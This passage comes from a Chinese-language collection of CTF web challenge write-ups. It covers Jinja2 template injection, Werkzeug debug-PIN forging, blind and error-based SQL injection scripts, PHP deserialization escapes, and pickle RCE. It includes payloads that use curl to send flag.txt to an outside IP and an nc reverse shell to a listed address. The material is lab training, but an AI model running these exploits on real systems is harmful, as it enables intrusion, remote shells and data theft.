=[\u0026amp;#34;flag\u0026amp;#34;,\u0026amp;#34;os\u0026amp;#34;,\u0026amp;#34;system\u0026amp;#34;,\u0026amp;#34;popen\u0026amp;#34;,\u0026amp;#34;import\u0026amp;#34;,\u0026amp;#34;eval\u0026amp;#34;,\u0026amp;#34;chr\u0026amp;#34;,\u0026amp;#34;request\u0026amp;#34;, \u0026amp;#34;subprocess\u0026amp;#34;,\u0026amp;#34;commands\u0026amp;#34;,\u0026amp;#34;socket\u0026amp;#34;,\u0026amp;#34;hex\u0026amp;#34;,\u0026amp;#34;base64\u0026amp;#34;,\u0026amp;#34;*\u0026amp;#34;,\u0026amp;#34;?\u0026amp;#34;]** 1 2 读取用户名 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;catch_warnings\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].open(\u0026#39;/etc/passwd\u0026#39;,\u0026#39;r\u0026#39;).read() }}{% endif %}{% endfor %} flaskweb\n1 2 当前网络的mac地址的十进制数。 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;catch_warnings\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].open(\u0026#39;/sys/class/net/eth0/address\u0026#39;,\u0026#39;r\u0026#39;).read() }}{% endif %}{% endfor %} 4e:4d:bc:b8:a0:2c\n1 将4e4dbcb8a02c转为10进制为86095785664556 1 2 读取机器id {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;catch_warnings\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].open(\u0026#39;/proc/self/cgroup\u0026#39;,\u0026#39;r\u0026#39;).read() }}{% endif %}{% endfor %} docker-513f790d4e2fc09de7be4e6c769883760f1a8090aa089d9bba99b995084759ea.scope\n但是这题是buu的要读linux的machine_id\n1 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;catch_warnings\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].open(\u0026#39;/etc/machine-id\u0026#39;,\u0026#39;r\u0026#39;).read() }}{% endif %}{% endfor %} 1408f836b0ca514d796cbf8960e45fa1\n生成pin码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 import hashlib from itertools import chain probably_public_bits = [ \u0026#39;flaskweb\u0026#39;# username \u0026#39;flask.app\u0026#39;,# modname \u0026#39;Flask\u0026#39;,# getattr(app, \u0026#39;__name__\u0026#39;, getattr(app.__class__, \u0026#39;__name__\u0026#39;)) \u0026#39;/usr/local/lib/python3.7/site-packages/flask/app.py\u0026#39; # getattr(mod, \u0026#39;__file__\u0026#39;, None), ] private_bits = [ \u0026#39;86095785664556\u0026#39;,# str(uuid.getnode()), /sys/class/net/ens33/address \u0026#39;1408f836b0ca514d796cbf8960e45fa1\u0026#39;# get_machine_id(), /etc/machine-id ] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(\u0026#39;utf-8\u0026#39;) h.update(bit) h.update(b\u0026#39;cookiesalt\u0026#39;) cookie_name = \u0026#39;__wzd\u0026#39; + h.hexdigest()[:20] num = None if num is None: h.update(b\u0026#39;pinsalt\u0026#39;) num = (\u0026#39;%09d\u0026#39; % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = \u0026#39;-\u0026#39;.join(num[x:x + group_size].rjust(group_size, \u0026#39;0\u0026#39;) for x in range(0, len(num), group_size)) break else: rv = num print(rv) 238-924-850\n在报错界面查找到有debug界面，输入pin码然后就可以在终端RCE了\n1 2 3 import os os.popen(\u0026#39;ls /\u0026#39;).read() os.popen(\u0026#39;cat /this_is_the_flag.txt\u0026#39;).read() [WUSTCTF2020]颜值成绩查询 布尔盲注\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 import requests url= \u0026#39;http://575aff7c-bbec-4a7a-8075-c9dd55f58df3.node5.buuoj.cn:81/\u0026#39; database =\u0026#34;\u0026#34; payload1 = \u0026#34;?stunum=1^(ascii(substr((select(database())),{},1))\u0026gt;{})^1\u0026#34; #库名为ctf payload2 = \u0026#34;?stunum=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=\u0026#39;ctf\u0026#39;)),{},1))\u0026gt;{})^1\u0026#34;#表名为flag,score payload3 =\u0026#34;?stunum=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=\u0026#39;flag\u0026#39;)),{},1))\u0026gt;{})^1\u0026#34; #列名为flag,value payload4 = \u0026#34;?stunum=1^(ascii(substr((select(group_concat(value))from(ctf.flag)),{},1))\u0026gt;{})^1\u0026#34; # for i in range(1,10000): low = 32 high = 128 mid =(low + high) // 2 while(low \u0026lt; high): # payload = payload1.format(i,mid) #查库名 # payload = payload2.format(i,mid) #查表名 # payload = payload3.format(i,mid) #查列名 payload = payload4.format(i,mid) #查flag new_url = url + payload r = requests.get(new_url) print(new_url) if \u0026#34;Hi admin, your score is: 100\u0026#34; in r.text: low = mid + 1 else: high = mid mid = (low + high) //2 if (mid == 32 or mid == 132): break database +=chr(mid) print(database) print(database) [FBCTF2019]RCEService 提示用json格式，传参是cmd\n我们ls一下\n1 {\u0026#34;cmd\u0026#34;:\u0026#34;ls\u0026#34;} 发现index.php\n但是原来题目有源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;?php putenv(\u0026#39;PATH=/home/rceservice/jail\u0026#39;); if (isset($_REQUEST[\u0026#39;cmd\u0026#39;])) { $json = $_REQUEST[\u0026#39;cmd\u0026#39;]; if (!is_string($json)) { echo \u0026#39;Hacking attempt detected\u0026lt;br/\u0026gt;\u0026lt;br/\u0026gt;\u0026#39;; } elseif (preg_match(\u0026#39;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/\u0026#39;, $json)) { echo \u0026#39;Hacking attempt detected\u0026lt;br/\u0026gt;\u0026lt;br/\u0026gt;\u0026#39;; } else { echo \u0026#39;Attempting to run command:\u0026lt;br/\u0026gt;\u0026#39;; $cmd = json_decode($json, true)[\u0026#39;cmd\u0026#39;]; if ($cmd !== NULL) { system($cmd); } else { echo \u0026#39;Invalid input\u0026#39;; } echo \u0026#39;\u0026lt;br/\u0026gt;\u0026lt;br/\u0026gt;\u0026#39;; } } ?\u0026gt; 因为preg_match只能匹配第一行，所以这里可以采用多行绕过。 因为putenv('PATH=/home/rceservice/jail');修改了环境变量，所以只能使用绝对路径使用cat命令，cat命令在/bin文件夹下\n1 2 3 ?cmd={%0A\u0026#34;cmd\u0026#34;:\u0026#34;/usr/bin/find / -name flag*\u0026#34;%0A} ?cmd={%0A\u0026#34;cmd\u0026#34;:\u0026#34;ls /home/rceservice\u0026#34;%0A} ?cmd={%0A\u0026#34;cmd\u0026#34;:\u0026#34;/bin/cat /home/rceservice/flag\u0026#34;%0A} 关于preg_match，有p神曾经讲的PRCE\n1 2 3 4 5 6 7 8 import requests url=\u0026#39;http://d5e835b5-ec7b-41b3-b1f3-8973c7ac6f60.node5.buuoj.cn:81/\u0026#39; data={ \u0026#39;cmd\u0026#39;:\u0026#39;{\u0026#34;cmd\u0026#34;:\u0026#34;/bin/cat /home/rceservice/flag\u0026#34;,\u0026#34;haha\u0026#34;:\u0026#34;\u0026#39;+\u0026#39;a\u0026#39;*1000000+\u0026#39;\u0026#34;}\u0026#39; } r=requests.post(url=url,data=data).text print(r) [SUCTF 2019]Pythonginx 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 @app.route(\u0026#39;/getUrl\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def getUrl(): url = request.args.get(\u0026#34;url\u0026#34;) host = parse.urlparse(url).hostname if host == \u0026#39;suctf.cc\u0026#39;: return \u0026#34;我扌 your problem? 111\u0026#34; parts = list(urlsplit(url)) host = parts[1] if host == \u0026#39;suctf.cc\u0026#39;: return \u0026#34;我扌 your problem? 222 \u0026#34; + host newhost = [] for h in host.split(\u0026#39;.\u0026#39;): newhost.append(h.encode(\u0026#39;idna\u0026#39;).decode(\u0026#39;utf-8\u0026#39;)) parts[1] = \u0026#39;.\u0026#39;.join(newhost) #去掉 url 中的空格 finalUrl = urlunsplit(parts).split(\u0026#39; \u0026#39;)[0] host = parse.urlparse(finalUrl).hostname if host == \u0026#39;suctf.cc\u0026#39;: return urllib.request.urlopen(finalUrl).read() else: return \u0026#34;我扌 your problem? 333\u0026#34; 从代码上看，我们需要提交一个url，用来读取服务器端任意文件\n简单来说，需要逃脱前两个if，成功进入第三个if。\n而三个if中判断条件都是相同的，不过在此之前的host构造却是不同的，这也是blackhat该议题中想要说明的一点\n当URL 中出现一些特殊字符的时候，输出的结果可能不在预期\n或者用%绕过\n1 U:℆ A:c/u ascii:8454 ，因为℆经过编码解码后就是c/u，这和我们想要的file://suctf.cc/usr/local/nginx/conf/nginx.conf，刚好℆可以替代c/u 接着我们只需要按照getUrl函数写出爆破脚本即可得到我们能够逃逸的构造语句了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 from urllib.parse import urlparse,urlunsplit,urlsplit from urllib import parse def get_unicode(): for x in range(65536): uni=chr(x) url=\u0026#34;http://suctf.c{}\u0026#34;.format(uni) try: if getUrl(url): print(\u0026#34;str: \u0026#34;+uni+\u0026#39; unicode: \\\\u\u0026#39;+str(hex(x))[2:]) except: pass def getUrl(url): url=url host=parse.urlparse(url).hostname if host == \u0026#39;suctf.cc\u0026#39;: return False parts=list(urlsplit(url)) host=parts[1] if host == \u0026#39;suctf.cc\u0026#39;: return False newhost=[] for h in host.split(\u0026#39;.\u0026#39;): newhost.append(h.encode(\u0026#39;idna\u0026#39;).decode(\u0026#39;utf-8\u0026#39;)) parts[1]=\u0026#39;.\u0026#39;.join(newhost) finalUrl=urlunsplit(parts).split(\u0026#39; \u0026#39;)[0] host=parse.urlparse(finalUrl).hostname if host == \u0026#39;suctf.cc\u0026#39;: return True else: return False if __name__==\u0026#39;__main__\u0026#39;: get_unicode() 先url编码，再传参\n1 /getUrl?url=file://suctf.c%E2%84%82/../../../../../etc/passwd 根据题目的提示得知，这里存有nginx服务贴上另外部分nginx的配置文件所在位置\n1 2 3 4 5 6 7 8 配置文件： /usr/local/nginx/conf/nginx.conf 配置文件存放目录：/etc/nginx 主配置文件：/etc/nginx/conf/nginx.conf 管理脚本：/usr/lib64/systemd/system/nginx.service 模块：/usr/lisb64/nginx/modules 应用程序：/usr/sbin/nginx 程序默认存放位置：/usr/share/nginx/html 日志默认存放位置：/var/log/nginx 1 /getUrl?url=file://suctf.cℂ/../../../../../usr/local/nginx/conf/nginx.conf 找到flag所在位置\n1 /getUrl?url=file://suctf.cℂ/../../../../../usr/fffffflag [0CTF 2016]piapiapia 目录扫描有www.zip\n下载源码发现有反序列化漏洞，要读取config.php来获得flag\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 if($_POST[\u0026#39;phone\u0026#39;] \u0026amp;\u0026amp; $_POST[\u0026#39;email\u0026#39;] \u0026amp;\u0026amp; $_POST[\u0026#39;nickname\u0026#39;] \u0026amp;\u0026amp; $_FILES[\u0026#39;photo\u0026#39;]) { $username = $_SESSION[\u0026#39;username\u0026#39;]; if(!preg_match(\u0026#39;/^\\d{11}$/\u0026#39;, $_POST[\u0026#39;phone\u0026#39;])) die(\u0026#39;Invalid phone\u0026#39;); if(!preg_match(\u0026#39;/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/\u0026#39;, $_POST[\u0026#39;email\u0026#39;])) die(\u0026#39;Invalid email\u0026#39;); if(preg_match(\u0026#39;/[^a-zA-Z0-9_]/\u0026#39;, $_POST[\u0026#39;nickname\u0026#39;]) || strlen($_POST[\u0026#39;nickname\u0026#39;]) \u0026gt; 10) die(\u0026#39;Invalid nickname\u0026#39;); $file = $_FILES[\u0026#39;photo\u0026#39;]; if($file[\u0026#39;size\u0026#39;] \u0026lt; 5 or $file[\u0026#39;size\u0026#39;] \u0026gt; 1000000) die(\u0026#39;Photo size error\u0026#39;); move_uploaded_file($file[\u0026#39;tmp_name\u0026#39;], \u0026#39;upload/\u0026#39; . md5($file[\u0026#39;name\u0026#39;])); $profile[\u0026#39;phone\u0026#39;] = $_POST[\u0026#39;phone\u0026#39;]; $profile[\u0026#39;email\u0026#39;] = $_POST[\u0026#39;email\u0026#39;]; $profile[\u0026#39;nickname\u0026#39;] = $_POST[\u0026#39;nickname\u0026#39;]; $profile[\u0026#39;photo\u0026#39;] = \u0026#39;upload/\u0026#39; . md5($file[\u0026#39;name\u0026#39;]); $user-\u0026gt;update_profile($username, serialize($profile)); echo \u0026#39;Update Profile Success!\u0026lt;a href=\u0026#34;profile.php\u0026#34;\u0026gt;Your Profile\u0026lt;/a\u0026gt;\u0026#39;; } 1 2 3 4 5 6 7 8 9 if($profile == null) { header(\u0026#39;Location: update.php\u0026#39;); } else { $profile = unserialize($profile); $phone = $profile[\u0026#39;phone\u0026#39;]; $email = $profile[\u0026#39;email\u0026#39;]; $nickname = $profile[\u0026#39;nickname\u0026#39;]; $photo = base64_encode(file_get_contents($profile[\u0026#39;photo\u0026#39;])); 1 2 3 4 5 6 7 8 9 public function filter($string) { $escape = array(\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\\\\\\\\\u0026#39;); $escape = \u0026#39;/\u0026#39; . implode(\u0026#39;|\u0026#39;, $escape) . \u0026#39;/\u0026#39;; $string = preg_replace($escape, \u0026#39;_\u0026#39;, $string); $safe = array(\u0026#39;select\u0026#39;, \u0026#39;insert\u0026#39;, \u0026#39;update\u0026#39;, \u0026#39;delete\u0026#39;, \u0026#39;where\u0026#39;); $safe = \u0026#39;/\u0026#39; . implode(\u0026#39;|\u0026#39;, $safe) . \u0026#39;/i\u0026#39;; return preg_replace($safe, \u0026#39;hacker\u0026#39;, $string); } 这里利用这个过滤器来绕过，参考前面的php反序列化字符逃逸\n在nickname的位置写入大量的黑名单使得被替换，然后就能匹配后面伪造的photo值，读取config.php\n这里我们要伪造的photo为\n1 \u0026#34;;s:5:\u0026#34;photo\u0026#34;;s:10:\u0026#34;config.php\u0026#34;;} 但是因为前面的nickname有长度限制要用数组绕过\n因为将nickname改为数组时，它在序列化时不会像字符一样闭合，所以要加多一个}。\n1 \u0026#34;;}s:5:\u0026#34;photo\u0026#34;;s:10:\u0026#34;config.php\u0026#34;;} 1 wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\u0026#34;;}s:5:\u0026#34;photo\u0026#34;;s:10:\u0026#34;config.php\u0026#34;;} 放包之后，把图片的base64解码出来就行了\n[Zer0pts2020]Can you guess it? 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 \u0026lt;?php include \u0026#39;config.php\u0026#39;; // FLAG is defined in config.php if (preg_match(\u0026#39;/config\\.php\\/*$/i\u0026#39;, $_SERVER[\u0026#39;PHP_SELF\u0026#39;])) { exit(\u0026#34;I don\u0026#39;t know what you are thinking, but I won\u0026#39;t let you read it :)\u0026#34;); } if (isset($_GET[\u0026#39;source\u0026#39;])) { highlight_file(basename($_SERVER[\u0026#39;PHP_SELF\u0026#39;])); exit(); } $secret = bin2hex(random_bytes(64)); if (isset($_POST[\u0026#39;guess\u0026#39;])) { $guess = (string) $_POST[\u0026#39;guess\u0026#39;]; if (hash_equals($secret, $guess)) { $message = \u0026#39;Congratulations! The flag is: \u0026#39; . FLAG; } else { $message = \u0026#39;Wrong.\u0026#39;; } } ?\u0026gt; \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Can you guess it?\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Can you guess it?\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;If your guess is correct, I\u0026#39;ll give you the flag.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;a href=\u0026#34;?source\u0026#34;\u0026gt;Source\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;?php if (isset($message)) { ?\u0026gt; \u0026lt;p\u0026gt;\u0026lt;?= $message ?\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;?php } ?\u0026gt; \u0026lt;form action=\u0026#34;index.php\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;guess\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 下面那个hash匹配随机数肯定不行，用上面的basename的bug绕过\nPHP :: Bug #62119 :: basename broken with non-ASCII-chars\n它会去掉文件名开头的非ASCII值：\n1 2 var_dump(basename(\u0026#34;xffconfig.php\u0026#34;)); // =\u0026gt; config.php var_dump(basename(\u0026#34;config.php/xff\u0026#34;)); // =\u0026gt; config.php 这样就能绕过匹配，用config.php/%ff\n因为basename函数的特性，它会返回文件名\n$_SERVER['PHP_SELF']会获取我们当前的访问路径,我们构造index.php/config.php,就会返回config.php\n最后访问source得到flag\n1 index.php/config.php/%ff?source [MRCTF2020]套娃 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;!-- //1st $query = $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]; if( substr_count($query, \u0026#39;_\u0026#39;) !== 0 || substr_count($query, \u0026#39;%5f\u0026#39;) != 0 ){ die(\u0026#39;Y0u are So cutE!\u0026#39;); } if($_GET[\u0026#39;b_u_p_t\u0026#39;] !== \u0026#39;23333\u0026#39; \u0026amp;\u0026amp; preg_match(\u0026#39;/^23333$/\u0026#39;, $_GET[\u0026#39;b_u_p_t\u0026#39;])){ echo \u0026#34;you are going to the next ~\u0026#34;; } !--\u0026gt; $_SERVER['QUERY_STRING']这个会匹配传入的?之后的字符\n_可以用空格或者.绕过，/23333$/这个只有尾部是23333才会被匹配到\n用23333%0A绕过\n1 2 3 ?b u p t=23333%0A 或者 ?b.u.p.t=23333%0A 进入下一层，注释里面一串jsfuck丢给控制台\npost传Merak,进入下一层\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 \u0026lt;?php error_reporting(0); include \u0026#39;takeip.php\u0026#39;; ini_set(\u0026#39;open_basedir\u0026#39;,\u0026#39;.\u0026#39;); include \u0026#39;flag.php\u0026#39;; if(isset($_POST[\u0026#39;Merak\u0026#39;])){ highlight_file(__FILE__); die(); } function change($v){ $v = base64_decode($v); $re = \u0026#39;\u0026#39;; for($i=0;$i\u0026lt;strlen($v);$i++){ $re .= chr ( ord ($v[$i]) + $i*2 ); } return $re; } echo \u0026#39;Local access only!\u0026#39;.\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;; $ip = getIp(); if($ip!=\u0026#39;127.0.0.1\u0026#39;) echo \u0026#34;Sorry,you don\u0026#39;t have permission! Your ip is :\u0026#34;.$ip; if($ip === \u0026#39;127.0.0.1\u0026#39; \u0026amp;\u0026amp; file_get_contents($_GET[\u0026#39;2333\u0026#39;]) === \u0026#39;todat is a happy day\u0026#39; ){ echo \u0026#34;Your REQUEST is:\u0026#34;.change($_GET[\u0026#39;file\u0026#39;]); echo file_get_contents(change($_GET[\u0026#39;file\u0026#39;])); } ?\u0026gt; 这里ip要求是127.0.0.1\n添加Client-Ip:127.0.0.1\n2333参数用data协议或者php://input传post也行\n而file要加密\n1 2 3 4 5 6 7 \u0026lt;?php $v=\u0026#39;flag.php\u0026#39;; $re=\u0026#39;\u0026#39;; for($i=0;$i\u0026lt;strlen($v);$i++){ $re.=chr ( ord ($v[$i]) - $i*2 ); } echo base64_encode($re); 1 ?2333=data://text/plain,todat%20is%20a%20happy%20day\u0026amp;file=ZmpdYSZmXGI= [CSCCTF 2019 Qual]FlaskLight jinja2的ssti\n查找到warnings类在59\n但是后面就会回显500状态怀疑过滤了global\n拼接绕过\n1 [].__class__.__base__.__subclasses__()[59].__init__[\u0026#39;__glo\u0026#39;+\u0026#39;bals__\u0026#39;][\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;ls\u0026#34;).read()\u0026#39;) 1 {{[].__class__.__base__.__subclasses__()[59].__init__[\u0026#39;__glo\u0026#39;+\u0026#39;bals__\u0026#39;][\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;cat flasklight/coomme_geeeett_youur_flek\u0026#34;).read()\u0026#39;)}} [watevrCTF-2019]Cookie Store 伪造cookie，base64编码得flag\n[WUSTCTF2020]CV Maker 注册登入，bp改为图片格式\n上传蚁剑连接\n[CISCN2019 华北赛区 Day1 Web2]ikun 上来提示爆破网站，要买到lv6,我们点开lv4的回显参数page,爆破page\n1 2 3 4 5 6 7 8 9 import requests url=\u0026#34;http://3ecc60d7-c14f-4805-9476-71bcd91747c8.node3.buuoj.cn/shop?page=\u0026#34; for i in range(0,2000): print(i) r=requests.get( url + str(i) ) if \u0026#39;lv6.png\u0026#39; in r.text: print (i) break 爆破出181\n抓包改折扣\n得到/b1g_m4mber路由,jwt伪造，key是1Kun\n查看源码后面能下载源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import tornado.web from sshop.base import BaseHandler import pickle import urllib class AdminHandler(BaseHandler): @tornado.web.authenticated def get(self, *args, **kwargs): if self.current_user == \u0026#34;admin\u0026#34;: return self.render(\u0026#39;form.html\u0026#39;, res=\u0026#39;This is Black Technology!\u0026#39;, member=0) else: return self.render(\u0026#39;no_ass.html\u0026#39;) @tornado.web.authenticated def post(self, *args, **kwargs): try: become = self.get_argument(\u0026#39;become\u0026#39;) p = pickle.loads(urllib.unquote(become)) return self.render(\u0026#39;form.html\u0026#39;, res=p, member=1) except: return self.render(\u0026#39;form.html\u0026#39;, res=\u0026#39;This is Black Technology!\u0026#39;, member=0) 1 p = pickle.loads(urllib.unquote(become)) 这里pickle提供了一个简单的持久化功能。用到反序列化\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 pickle.dump(obj, file, [,protocol]) 函数的功能：将obj对象序列化存入已经打开的file中。 参数讲解： obj：想要序列化的obj对象。 file:文件名称。 protocol：序列化使用的协议。如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。 pickle.load(file) 函数的功能：将file中的对象序列化读出。 参数讲解： file：文件名称。 pickle.dumps(obj[, protocol]) 函数的功能：将obj对象序列化为string形式，而不是存入文件中。 参数讲解： obj：想要序列化的obj对象。 protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。 pickle.loads(string) 函数的功能：从string中读出序列化前的obj对象。 参数讲解： string：文件名称。 【注】 dump() 与 load() 相比 dumps() 和 loads() 还有另一种能力：dump()函数能一个接着一个地将几个对象序列化存储到同一个文件中，随后调用load()来以同样的顺序反序列化读出这些对象。而在__reduce__方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码 检测反序列化方法：全局搜索Python代码中是否含有关键字类似“import cPickle”或“import pickle”等，若存在则进一步确认是否调用cPickle.loads()或pickle.loads()且反序列化的参数可控。 脚本\n1 2 3 4 5 6 7 8 9 10 import pickle import urllib class payload(object): def __reduce__(self): return (eval, (\u0026#34;open(\u0026#39;/flag.txt\u0026#39;,\u0026#39;r\u0026#39;).read()\u0026#34;,)) a = pickle.dumps(payload()) a = urllib.quote(a) print(a) 要在py2环境用\n下面这个是py3的脚本\n1 2 3 4 5 6 7 8 9 10 import pickle import urllib import commands class payload(object): def __reduce__(self): return (commands.getoutput,(\u0026#39;ls /\u0026#39;,)) a = payload() print urllib.quote(pickle.dumps(a)) 然后cat /flag.txt\n[红明谷CTF 2021]write_shell action传pwd,看目录\nsandbox/fc3f8d0d99ccdde85c8cfc624fe94c32/\n1 ?action=upload\u0026amp;data=\u0026lt;?=%09`ls%09/`?\u0026gt; 1 ?action=upload\u0026amp;data=\u0026lt;?=%09`cat%09/flllllll1112222222lag`?\u0026gt; %09-\u0026gt;空格，反引号可以执行shell命令\n[watevrCTF-2019]Pickle Store 抓包拿cookie\n一串base64，题目提示pickle,解码后反序列化\n1 2 3 4 5 import pickle import base64 a=pickle.loads(base64.b64decode(b\u0026#39;gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu\u0026#39;)) print(a) 1 {\u0026#39;money\u0026#39;: 500, \u0026#39;history\u0026#39;: [], \u0026#39;anti_tamper_hmac\u0026#39;: \u0026#39;aa1ba4de55048cf20e0a7a63b7f8eb62\u0026#39;} 可见其中带上了hmac验证。\n接下来最简单的是直接弹shell\n1 2 3 4 5 6 7 import pickle import base64 class A(object): def __reduce__(self): return (eval,(\u0026#34;__import__(\u0026#39;os\u0026#39;).system(\u0026#39;curl -d @flag.txt 174.0.157.204:2333\u0026#39;)\u0026#34;,)) a = A() print(base64.b64encode(pickle.dumps(a))) 1 2 3 4 5 6 7 import pickle import base64 class A(object): def __reduce__(self): return (eval,(\u0026#34;__import__(\u0026#39;os\u0026#39;).system(\u0026#39;curl http://119.xxx.xxx.xxx/`cat flag.txt|base64`\u0026#39;)\u0026#34;,)) a = A() print(base64.b64encode(pickle.dumps(a))) 1 2 3 4 5 6 7 8 import base64 import pickle class A(object): def __reduce__(self): return (eval, (\u0026#34;__import__(\u0026#39;os\u0026#39;).system(\u0026#39;nc 119.29.60.71 9999 -e/bin/sh\u0026#39;)\u0026#34;,)) a = A() print(base64.b64encode(pickle.dumps(a))) 或者cookie伪造\n首先反序列化的pickle流中包含了给key赋值的操作，反序列化后key值会被覆盖\n1 2 3 4 5 6 7 8 9 10 import pickle import hmac key=b\u0026#39;66666666666666666666666666666666\u0026#39; cookies = {\u0026#34;money\u0026#34;:10000,\u0026#34;history\u0026#34;:[]} h = hmac.new(key) h.update(str(cookies).encode()) cookies[\u0026#34;anti_tamper_hmac\u0026#34;] = h.digest().hex() result2 = pickle.dumps(cookies) print(result2) 这里把余额设置为10000，并用我们自己的key来给cookie做签名，得到的pickle流：\n1 b\u0026#34;\\x80\\x03}q\\x00(X\\x05\\x00\\x00\\x00moneyq\\x01M\\x10\u0026#39;X\\x07\\x00\\x00\\x00historyq\\x02]q\\x03X\\x10\\x00\\x00\\x00anti_tamper_hmacq\\x04X \\x00\\x00\\x00ccb487eec1cb66dda8d00a8121aeb4bfq\\x05u.\u0026#34; [RCTF2015]EasySQL 发现有二次注入，在修改密码时触发\n1 admin\u0026#34;||extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),0x7e))# 1 2 admin\u0026#34;||extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)=\u0026#39;flag\u0026#39;)))# admin\u0026#34;||extractvalue(1,concat(0x7e,(select(flag)from(flag))))# 假flag\n1 admin\u0026#34;||extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)=\u0026#39;users\u0026#39;)))# 没回显完全，但是mid,left,right,substr都被过滤了\n这里用到正则匹配regexp('^f')：查找开头f的字符串\n1 2 3 1\u0026#34;||extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=\u0026#39;users\u0026#39;)\u0026amp;\u0026amp;(column_name)regexp(\u0026#39;^r\u0026#39;))))# 或者reverse函数倒转 admin\u0026#34;||extractvalue(1,concat(0x7e,reverse((select(group_concat(column_name))from(information_schema.columns)where(table_name)=\u0026#39;users\u0026#39;))))# 1 admin\u0026#34;||extractvalue(1,concat(0x7e,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(\u0026#39;^f\u0026#39;))))# extractvalue最多只能显示32位的原因，报错回显不能够完全显示flag的值，我们可以依然使用 reverse()函数，将flag值倒置输出，再利用sql语句将倒置部分恢复，将前后两部分flag拼接到一起，就可以获得完整的flag值。\n1 admin\u0026#34;||extractvalue(1,concat(0x7e,reverse((select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(\u0026#39;^f\u0026#39;)))))# 1 2 3 a=\u0026#39;}ca0da771c04c-e69b-dab4-3f8f-e3\u0026#39; b=a[::-1] print(b) [GWCTF 2019]枯燥的抽奖 